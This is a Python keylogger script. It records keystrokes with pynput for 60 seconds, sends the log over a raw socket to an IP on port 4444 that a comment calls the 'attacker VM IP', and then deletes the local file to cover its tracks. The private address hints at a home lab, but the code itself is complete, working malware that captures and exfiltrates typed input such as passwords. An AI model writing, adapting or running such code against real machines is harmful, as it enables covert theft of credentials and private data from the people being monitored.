from pynput import keyboard
import socket
import time
import os  # Added for file deletion

log = "keylog.txt"
start_time = time.time()
duration = 60  # run for 60 seconds

def on_press(key):
    if time.time() - start_time > duration:
        return False

    try:
        with open(log, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log, "a") as f:
                f.write("\n")
        # Other special keys are ignored

def send_log():
    host = "192.168.29.132"  # Replace with attacker VM IP
    port = 4444

    try:
        with socket.socket() as s:
            s.connect((host, port))
            with open(log, "rb") as f:
                data = f.read()
                s.sendall(data)
                time.sleep(1)
                s.send(b"DONE")

        # Delete the log file after successful send
        os.remove(log)
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

send_log()
